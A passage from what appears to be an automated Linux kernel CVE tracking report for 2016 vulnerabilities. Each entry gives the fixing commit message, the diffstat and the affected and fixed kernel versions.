    context, caused by the overwritten CPU index in the thread_info).
    
    Just panic directly.
    
    Signed-off-by: Jann Horn <jannh@google.com>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 kernel/sched/core.c |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-1583
Break Date: 2014-09-19
Break Commit: 0d9e26329b0c9263d4d9e0422d80a0e73268c52f
Break Tag: 3.18
Linus Fix Date: 2016-06-10
Linus Commit: 29d6455178a09e1dc340380c582b13356227e8df
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-2053:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f
Author: David Howells <dhowells@redhat.com>
Date:   Wed Aug 5 12:54:46 2015 +0100

    ASN.1: Fix non-match detection failure on data overrun
    
    If the ASN.1 decoder is asked to parse a sequence of objects, non-optional
    matches get skipped if there's no more data to be had rather than a
    data-overrun error being reported.
    
    This is due to the code segment that decides whether to skip optional
    matches (ie. matches that could get ignored because an element is marked
    OPTIONAL in the grammar) due to a lack of data also skips non-optional
    elements if the data pointer has reached the end of the buffer.
    
    This can be tested with the data decoder for the new RSA akcipher algorithm
    that takes three non-optional integers.  Currently, it skips the last
    integer if there is insufficient data.
    
    Without the fix, #defining DEBUG in asn1_decoder.c will show something
    like:
    
    	next_op: pc=0/13 dp=0/270 C=0 J=0
    	- match? 30 30 00
    	- TAG: 30 266 CONS
    	next_op: pc=2/13 dp=4/270 C=1 J=0
    	- match? 02 02 00
    	- TAG: 02 257
    	- LEAF: 257
    	next_op: pc=5/13 dp=265/270 C=1 J=0
    	- match? 02 02 00
    	- TAG: 02 3
    	- LEAF: 3
    	next_op: pc=8/13 dp=270/270 C=1 J=0
    	next_op: pc=11/13 dp=270/270 C=1 J=0
    	- end cons t=4 dp=270 l=270/270
    
    The next_op line for pc=8/13 should be followed by a match line.
    
    This is not exploitable for X.509 certificates by means of shortening the
    message and fixing up the ASN.1 CONS tags because:
    
     (1) The relevant records being built up are cleared before use.
    
     (2) If the message is shortened sufficiently to remove the public key, the
         ASN.1 parse of the RSA key will fail quickly due to a lack of data.
    
     (3) Extracted signature data is either turned into MPIs (which cope with a
         0 length) or is simpler integers specifying algoritms and suchlike
         (which can validly be 0); and
    
     (4) The AKID and SKID extensions are optional and their removal is handled
         without risking passing a NULL to asymmetric_key_generate_id().
    
     (5) If the certificate is truncated sufficiently to remove the subject,
         issuer or serialNumber then the ASN.1 decoder will fail with a 'Cons
         stack underflow' return.
    
    This is not exploitable for PKCS#7 messages by means of removal of elements
    from such a message from the tail end of a sequence:
    
     (1) Any shortened X.509 certs embedded in the PKCS#7 message are survivable
         as detailed above.
    
     (2) The message digest content isn't used if it shows a NULL pointer,
         similarly, the authattrs aren't used if that shows a NULL pointer.
    
     (3) A missing signature results in a NULL MPI - which the MPI routines deal
         with.
    
     (4) If data is NULL, it is expected that the message has detached content and
         that is handled appropriately.
    
     (5) If the serialNumber is excised, the unconditional action associated
         with it will pick up the containing SEQUENCE instead, so no NULL
         pointer will be seen here.
    
         If both the issuer and the serialNumber are excised, the ASN.1 decode
         will fail with an 'Unexpected tag' return.
    
         In either case, there's no way to get to asymmetric_key_generate_id()
         with a NULL pointer.
    
     (6) Other fields are decoded to simple integers.  Shortening the message
         to omit an algorithm ID field will cause checks on this to fail early
         in the verification process.
    
    
    This can also be tested by snipping objects off of the end of the ASN.1 stream
    such that mandatory tags are removed - or even from the end of internal
    SEQUENCEs.  If any mandatory tag is missing, the error EBADMSG *should* be
    produced.  Without this patch ERANGE or ENOPKG might be produced or the parse
    may apparently succeed, perhaps with ENOKEY or EKEYREJECTED being produced
    later, depending on what gets snipped.
    
    Just snipping off the final BIT_STRING or OCTET_STRING from either sample
    should be a start since both are mandatory and neither will cause an EBADMSG
    without the patches
    
    Reported-by: Marcel Holtmann <marcel@holtmann.org>
    Signed-off-by: David Howells <dhowells@redhat.com>
    Tested-by: Marcel Holtmann <marcel@holtmann.org>
    Reviewed-by: David Woodhouse <David.Woodhouse@intel.com>

 lib/asn1_decoder.c |    5 ++---
 1 file changed, 2 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-2053
Break Date: 2013-09-25
Break Commit: 3d167d68e3805ee45ed2e8412fc03ed919c54c24
Break Tag: 3.13
Linus Fix Date: 2015-08-05
Linus Commit: 0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f
Linus Tag: 4.3
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-2069:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 71b3c126e61177eb693423f2e18a1914205b165e
Author: Andy Lutomirski <luto@kernel.org>
Date:   Wed Jan 6 12:21:01 2016 -0800

    x86/mm: Add barriers and document switch_mm()-vs-flush synchronization
    
    When switch_mm() activates a new PGD, it also sets a bit that
    tells other CPUs that the PGD is in use so that TLB flush IPIs
    will be sent.  In order for that to work correctly, the bit
    needs to be visible prior to loading the PGD and therefore
    starting to fill the local TLB.
    
    Document all the barriers that make this work correctly and add
    a couple that were missing.
    
    Signed-off-by: Andy Lutomirski <luto@kernel.org>
    Cc: Andrew Morton <akpm@linux-foundation.org>
    Cc: Andy Lutomirski <luto@amacapital.net>
    Cc: Borislav Petkov <bp@alien8.de>
    Cc: Brian Gerst <brgerst@gmail.com>
    Cc: Dave Hansen <dave.hansen@linux.intel.com>
    Cc: Denys Vlasenko <dvlasenk@redhat.com>
    Cc: H. Peter Anvin <hpa@zytor.com>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Peter Zijlstra <peterz@infradead.org>
    Cc: Rik van Riel <riel@redhat.com>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: linux-mm@kvack.org
    Cc: stable@vger.kernel.org
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/include/asm/mmu_context.h |   33 ++++++++++++++++++++++++++++++++-
 arch/x86/mm/tlb.c                  |   29 ++++++++++++++++++++++++++---
 2 files changed, 58 insertions(+), 4 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2069
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-11
Linus Commit: 71b3c126e61177eb693423f2e18a1914205b165e
Linus Tag: 4.5
Stable Date: 2016-08-16
Stable Commit: 1b8542cd64724bb7b61dcc0ccfe0ccbefff1bc2d
Stable Tag: 3.14.76

CVE-2016-2069:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4eaffdd5a5fe6ff9f95e1ab4de1ac904d5e0fa8b
Author: Andy Lutomirski <luto@kernel.org>
Date:   Tue Jan 12 12:47:40 2016 -0800

    x86/mm: Improve switch_mm() barrier comments
    
    My previous comments were still a bit confusing and there was a
    typo. Fix it up.
    
    Reported-by: Peter Zijlstra <peterz@infradead.org>
    Signed-off-by: Andy Lutomirski <luto@kernel.org>
    Cc: Andy Lutomirski <luto@amacapital.net>
    Cc: Borislav Petkov <bp@alien8.de>
    Cc: Brian Gerst <brgerst@gmail.com>
    Cc: Dave Hansen <dave.hansen@linux.intel.com>
    Cc: Denys Vlasenko <dvlasenk@redhat.com>
    Cc: H. Peter Anvin <hpa@zytor.com>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Rik van Riel <riel@redhat.com>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: stable@vger.kernel.org
    Fixes: 71b3c126e611 ("x86/mm: Add barriers and document switch_mm()-vs-flush synchronization")
    Link: http://lkml.kernel.org/r/0a0b43cdcdd241c5faaaecfbcc91a155ddedc9a1.1452631609.git.luto@kernel.org
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/include/asm/mmu_context.h |   15 ++++++++-------
 1 file changed, 8 insertions(+), 7 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2069
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-01-13
Linus Commit: 4eaffdd5a5fe6ff9f95e1ab4de1ac904d5e0fa8b
Linus Tag: 4.5
Stable Date: 2016-08-16
Stable Commit: 46fdf98a98555bcdd2b05e5f8851f42bd2037b4c
Stable Tag: 3.14.76

CVE-2016-2070:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 8b8a321ff72c785ed5e8b4cf6eda20b35d427390
Author: Yuchung Cheng <ycheng@google.com>
Date:   Wed Jan 6 12:42:38 2016 -0800

    tcp: fix zero cwnd in tcp_cwnd_reduction
    
    Patch 3759824da87b ("tcp: PRR uses CRB mode by default and SS mode
    conditionally") introduced a bug that cwnd may become 0 when both
    inflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead
    to a div-by-zero if the connection starts another cwnd reduction
    phase by setting tp->prior_cwnd to the current cwnd (0) in
    tcp_init_cwnd_reduction().
    
    To prevent this we skip PRR operation when nothing is acked or
    sacked. Then cwnd must be positive in all cases as long as ssthresh
    is positive:
    
    1) The proportional reduction mode
       inflight > ssthresh > 0
    
    2) The reduction bound mode
      a) inflight == ssthresh > 0
    
      b) inflight < ssthresh
         sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh
    
    Therefore in all cases inflight and sndcnt can not both be 0.
    We check invalid tp->prior_cwnd to avoid potential div0 bugs.
    
    In reality this bug is triggered only with a sequence of less common
    events.  For example, the connection is terminating an ECN-triggered
    cwnd reduction with an inflight 0, then it receives reordered/old
    ACKs or DSACKs from prior transmission (which acks nothing). Or the
    connection is in fast recovery stage that marks everything lost,
    but fails to retransmit due to local issues, then receives data
    packets from other end which acks nothing.
    
    Fixes: 3759824da87b ("tcp: PRR uses CRB mode by default and SS mode conditionally")
    Reported-by: Oleksandr Natalenko <oleksandr@natalenko.name>
    Signed-off-by: Yuchung Cheng <ycheng@google.com>
    Signed-off-by: Neal Cardwell <ncardwell@google.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/tcp_input.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-2070
Break Date: 2015-07-08
Break Commit: 3759824da87b30ce7a35b4873b62b0ba38905ef5
Break Tag: 4.3
Linus Fix Date: 2016-01-06
Linus Commit: 8b8a321ff72c785ed5e8b4cf6eda20b35d427390
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-2085:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.61.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 613317bd212c585c20796c10afe5daaa95d4b0a1
Author: Ryan Ware <ware@linux.intel.com>
Date:   Thu Feb 11 15:58:44 2016 -0800

    EVM: Use crypto_memneq() for digest comparisons
    
    This patch fixes vulnerability CVE-2016-2085.  The problem exists
    because the vm_verify_hmac() function includes a use of memcmp().
    Unfortunately, this allows timing side channel attacks; specifically
    a MAC forgery complexity drop from 2^128 to 2^12.  This patch changes
    the memcmp() to the cryptographically safe crypto_memneq().
    
    Reported-by: Xiaofei Rex Guo <xiaofei.rex.guo@intel.com>
    Signed-off-by: Ryan Ware <ware@linux.intel.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/integrity/evm/evm_main.c |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2085
Break Date: 2011-11-09
Break Commit: 15647eb3985ef30dfd657038924dc85c03026733
Break Tag: 3.3
Linus Fix Date: 2016-02-12
Linus Commit: 613317bd212c585c20796c10afe5daaa95d4b0a1
Linus Tag: 4.5
Stable Date: 2016-02-17
Stable Commit: 6121dabef629c5b584abd617bba87f420b7f4011
Stable Tag: 3.14.61

CVE-2016-2117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.70.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f43bfaeddc79effbf3d0fcb53ca477cca66f3db8
Author: Ben Hutchings <ben@decadent.org.uk>
Date:   Wed Apr 20 23:23:08 2016 +0100

    atl2: Disable unimplemented scatter/gather feature
    
    atl2 includes NETIF_F_SG in hw_features even though it has no support
    for non-linear skbs.  This bug was originally harmless since the
    driver does not claim to implement checksum offload and that used to
    be a requirement for SG.
    
    Now that SG and checksum offload are independent features, if you
    explicitly enable SG *and* use one of the rare protocols that can use
    SG without checkusm offload, this potentially leaks sensitive
    information (before you notice that it just isn't working).  Therefore
    this obscure bug has been designated CVE-2016-2117.
    
    Reported-by: Justin Yackoski <jyackoski@crypto-nite.com>
    Signed-off-by: Ben Hutchings <ben@decadent.org.uk>
    Fixes: ec5f06156423 ("net: Kill link between CSUM and SG features.")
    Signed-off-by: David S. Miller <davem@davemloft.net>

 drivers/net/ethernet/atheros/atlx/atl2.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-2117
Break Date: 2013-03-09
Break Commit: ec5f061564238892005257c83565a0b58ec79295
Break Tag: 3.10
Linus Fix Date: 2016-04-21
Linus Commit: f43bfaeddc79effbf3d0fcb53ca477cca66f3db8
Linus Tag: 4.6
Stable Date: 2016-05-18
Stable Commit: d6b8a68ac7b6d2e241f8d34b769c98a1793d9124
Stable Tag: 3.14.70

CVE-2016-2143:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 3446c13b268af86391d06611327006b059b8bab1
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Feb 15 14:46:49 2016 +0100

    s390/mm: four page table levels vs. fork
    
    The fork of a process with four page table levels is broken since
    git commit 6252d702c5311ce9 "[S390] dynamic page tables."
    
    All new mm contexts are created with three page table levels and
    an asce limit of 4TB. If the parent has four levels dup_mmap will
    add vmas to the new context which are outside of the asce limit.
    The subsequent call to copy_page_range will walk the three level
    page table structure of the new process with non-zero pgd and pud
    indexes. This leads to memory clobbers as the pgd_index *and* the
    pud_index is added to the mm->pgd pointer without a pgd_deref
    in between.
    
    The init_new_context() function is selecting the number of page
    table levels for a new context. The function is used by mm_init()
    which in turn is called by dup_mm() and mm_alloc(). These two are
    used by fork() and exec(). The init_new_context() function can
    distinguish the two cases by looking at mm->context.asce_limit,
    for fork() the mm struct has been copied and the number of page
    table levels may not change. For exec() the mm_alloc() function
    set the new mm structure to zero, in this case a three-level page
    table is created as the temporary stack space is located at
    STACK_TOP_MAX = 4TB.
    
    This fixes CVE-2016-2143.
    
    Reported-by: Marcin Kocielnicki <koriakin@0x04.net>
    Reviewed-by: Heiko Carstens <heiko.carstens@de.ibm.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 arch/s390/include/asm/mmu_context.h |   16 +++++++++++-----
 arch/s390/include/asm/pgalloc.h     |   24 +++++++++++++++++++-----
 2 files changed, 30 insertions(+), 10 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2143
Break Date: 2008-02-09
Break Commit: 6252d702c5311ce916caf75ed82e5c8245171c92
Break Tag: 2.6
Linus Fix Date: 2016-03-10
Linus Commit: 3446c13b268af86391d06611327006b059b8bab1
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-2184:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 0f886ca12765d20124bd06291c82951fd49a33be
Author: Takashi Iwai <tiwai@suse.de>
Date:   Tue Mar 15 12:09:10 2016 +0100

    ALSA: usb-audio: Fix NULL dereference in create_fixed_stream_quirk()
    
    create_fixed_stream_quirk() may cause a NULL-pointer dereference by
    accessing the non-existing endpoint when a USB device with a malformed
    USB descriptor is used.
    
    This patch avoids it simply by adding a sanity check of bNumEndpoints
    before the accesses.
    
    Bugzilla: https://bugzilla.suse.com/show_bug.cgi?id=971125
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/usb/quirks.c |    6 ++++++
 1 file changed, 6 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2184
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-16
Linus Commit: 0f886ca12765d20124bd06291c82951fd49a33be
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 7963d34edc58f8e40c0891262cac6e443346313f
Stable Tag: 3.14.66

CVE-2016-2184:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 447d6275f0c21f6cc97a88b3a0c601436a4cdf2a
Author: Takashi Iwai <tiwai@suse.de>
Date:   Tue Mar 15 15:20:58 2016 +0100

    ALSA: usb-audio: Add sanity checks for endpoint accesses
    
    Add some sanity check codes before actually accessing the endpoint via
    get_endpoint() in order to avoid the invalid access through a
    malformed USB descriptor.  Mostly just checking bNumEndpoints, but in
    one place (snd_microii_spdif_default_get()), the validity of iface and
    altsetting index is checked as well.
    
    Bugzilla: https://bugzilla.suse.com/show_bug.cgi?id=971125
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

 sound/usb/clock.c        |    2 ++
 sound/usb/endpoint.c     |    3 +++
 sound/usb/mixer_quirks.c |    4 ++++
 sound/usb/pcm.c          |    2 ++
 4 files changed, 11 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2184
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-16
Linus Commit: 447d6275f0c21f6cc97a88b3a0c601436a4cdf2a
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 70e1a065eb16bae77c8bce1ae282c76f33ef65dd
Stable Tag: 3.14.66

CVE-2016-2185:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 950336ba3e4a1ffd2ca60d29f6ef386dd2c7351d
Author: Vladis Dronov <vdronov@redhat.com>
Date:   Wed Mar 23 11:53:46 2016 -0700

    Input: ati_remote2 - fix crashes on detecting device with invalid descriptor
    
    The ati_remote2 driver expects at least two interfaces with one
    endpoint each. If given malicious descriptor that specify one
    interface or no endpoints, it will crash in the probe function.
    Ensure there is at least two interfaces and one endpoint for each
    interface before using it.
    
    The full disclosure: http://seclists.org/bugtraq/2016/Mar/90
    
    Reported-by: Ralf Spenneberg <ralf@spenneberg.net>
    Signed-off-by: Vladis Dronov <vdronov@redhat.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

 drivers/input/misc/ati_remote2.c |   36 ++++++++++++++++++++++++++++++------
 1 file changed, 30 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-2185
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-23
Linus Commit: 950336ba3e4a1ffd2ca60d29f6ef386dd2c7351d
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 52844be6f96c447577de40ea7d2f4019457a7dd9
Stable Tag: 3.14.66

CVE-2016-2186:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 9c6ba456711687b794dcf285856fc14e2c76074f
Author: Josh Boyer <jwboyer@fedoraproject.org>
Date:   Mon Mar 14 09:33:40 2016 -0700

    Input: powermate - fix oops with malicious USB descriptors
    
    The powermate driver expects at least one valid USB endpoint in its
    probe function.  If given malicious descriptors that specify 0 for
    the number of endpoints, it will crash.  Validate the number of
    endpoints on the interface before using them.
    
    The full report for this issue can be found here:
    http://seclists.org/bugtraq/2016/Mar/85
    
    Reported-by: Ralf Spenneberg <ralf@spenneberg.net>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org>
    Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

 drivers/input/misc/powermate.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-2186
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-14
Linus Commit: 9c6ba456711687b794dcf285856fc14e2c76074f
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 5c91a520b0d6d2700c96d3b8198d7e3cfddce538
Stable Tag: 3.14.66

CVE-2016-2187:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.68.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 162f98dea487206d9ab79fc12ed64700667a894d
Author: Vladis Dronov <vdronov@redhat.com>
Date:   Thu Mar 31 10:53:42 2016 -0700

    Input: gtco - fix crash on detecting device without endpoints
    
    The gtco driver expects at least one valid endpoint. If given malicious
    descriptors that specify 0 for the number of endpoints, it will crash in
    the probe function. Ensure there is at least one endpoint on the interface
    before using it.
    
    Also let's fix a minor coding style issue.
    
    The full correct report of this issue can be found in the public
    Red Hat Bugzilla:
    
    https://bugzilla.redhat.com/show_bug.cgi?id=1283385
    
    Reported-by: Ralf Spenneberg <ralf@spenneberg.net>
    Signed-off-by: Vladis Dronov <vdronov@redhat.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

 drivers/input/tablet/gtco.c |   10 +++++++++-
 1 file changed, 9 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-2187
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-31
Linus Commit: 162f98dea487206d9ab79fc12ed64700667a894d
Linus Tag: 4.6
Stable Date: 2016-05-04
Stable Commit: f090502c9f10046d293508f022ed00796a541b37
Stable Tag: 3.14.68

CVE-2016-2188:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4ec0ef3a82125efc36173062a50624550a900ae0
Author: Josh Boyer <jwboyer@fedoraproject.org>
Date:   Mon Mar 14 10:42:38 2016 -0400

    USB: iowarrior: fix oops with malicious USB descriptors
    
    The iowarrior driver expects at least one valid endpoint.  If given
    malicious descriptors that specify 0 for the number of endpoints,
    it will crash in the probe function.  Ensure there is at least
    one endpoint on the interface before using it.
    
    The full report of this issue can be found here:
    http://seclists.org/bugtraq/2016/Mar/87
    
    Reported-by: Ralf Spenneberg <ralf@spenneberg.net>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/misc/iowarrior.c |    6 ++++++
 1 file changed, 6 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-2188
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-18
Linus Commit: 4ec0ef3a82125efc36173062a50624550a900ae0
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 1c882bf53cdfd264f90d2a4cfac510321df7a73f
Stable Tag: 3.14.66

CVE-2016-2383:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit a1b14d27ed0965838350f1377ff97c93ee383492
Author: Daniel Borkmann <daniel@iogearbox.net>
Date:   Wed Feb 10 16:47:11 2016 +0100

    bpf: fix branch offset adjustment on backjumps after patching ctx expansion
    
    When ctx access is used, the kernel often needs to expand/rewrite
    instructions, so after that patching, branch offsets have to be
    adjusted for both forward and backward jumps in the new eBPF program,
    but for backward jumps it fails to account the delta. Meaning, for
    example, if the expansion happens exactly on the insn that sits at
    the jump target, it doesn't fix up the back jump offset.
    
    Analysis on what the check in adjust_branches() is currently doing:
    
      /* adjust offset of jmps if necessary */
      if (i < pos && i + insn->off + 1 > pos)
        insn->off += delta;
      else if (i > pos && i + insn->off + 1 < pos)
        insn->off -= delta;
    
    First condition (forward jumps):
    
      Before:                         After:
    
      insns[0]                        insns[0]
      insns[1] <--- i/insn            insns[1] <--- i/insn
      insns[2] <--- pos               insns[P] <--- pos
      insns[3]                        insns[P]  `------| delta
      insns[4] <--- target_X          insns[P]   `-----|
      insns[5]                        insns[3]
                                      insns[4] <--- target_X
                                      insns[5]
    
    First case is if we cross pos-boundary and the jump instruction was
    before pos. This is handeled correctly. I.e. if i == pos, then this
    would mean our jump that we currently check was the patchlet itself
    that we just injected. Since such patchlets are self-contained and
    have no awareness of any insns before or after the patched one, the
    delta is correctly not adjusted. Also, for the second condition in
    case of i + insn->off + 1 == pos, means we jump to that newly patched
    instruction, so no offset adjustment are needed. That part is correct.
    
    Second condition (backward jumps):
    
      Before:                         After:
    
      insns[0]                        insns[0]
      insns[1] <--- target_X          insns[1] <--- target_X
      insns[2] <--- pos <-- target_Y  insns[P] <--- pos <-- target_Y
      insns[3]                        insns[P]  `------| delta
      insns[4] <--- i/insn            insns[P]   `-----|
      insns[5]                        insns[3]
                                      insns[4] <--- i/insn
                                      insns[5]
    
    Second interesting case is where we cross pos-boundary and the jump
    instruction was after pos. Backward jump with i == pos would be
    impossible and pose a bug somewhere in the patchlet, so the first
    condition checking i > pos is okay only by itself. However, i +
    insn->off + 1 < pos does not always work as intended to trigger the
    adjustment. It works when jump targets would be far off where the
    delta wouldn't matter. But, for example, where the fixed insn->off
    before pointed to pos (target_Y), it now points to pos + delta, so
    that additional room needs to be taken into account for the check.
    This means that i) both tests here need to be adjusted into pos + delta,
    and ii) for the second condition, the test needs to be <= as pos
    itself can be a target in the backjump, too.
    
    Fixes: 9bac3d6d548e ("bpf: allow extended BPF programs access skb fields")
    Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 kernel/bpf/verifier.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-2383
Break Date: 2015-03-15
Break Commit: 9bac3d6d548e5cc925570b263f35b70a00a00ffd
Break Tag: 4.1
Linus Fix Date: 2016-02-10
Linus Commit: a1b14d27ed0965838350f1377ff97c93ee383492
Linus Tag: 4.5
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-2384:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.61.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 07d86ca93db7e5cdf4743564d98292042ec21af7
Author: Andrey Konovalov <andreyknvl@gmail.com>
Date:   Sat Feb 13 11:08:06 2016 +0300

    ALSA: usb-audio: avoid freeing umidi object twice
    
    The 'umidi' object will be free'd on the error path by snd_usbmidi_free()
    when tearing down the rawmidi interface. So we shouldn't try to free it
    in snd_usbmidi_create() after having registered the rawmidi interface.
    
    Found by KASAN.
    
    Signed-off-by: Andrey Konovalov <andreyknvl@gmail.com>
    Acked-by: Clemens Ladisch <clemens@ladisch.de>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Takashi Iwai <tiwai@suse.de>

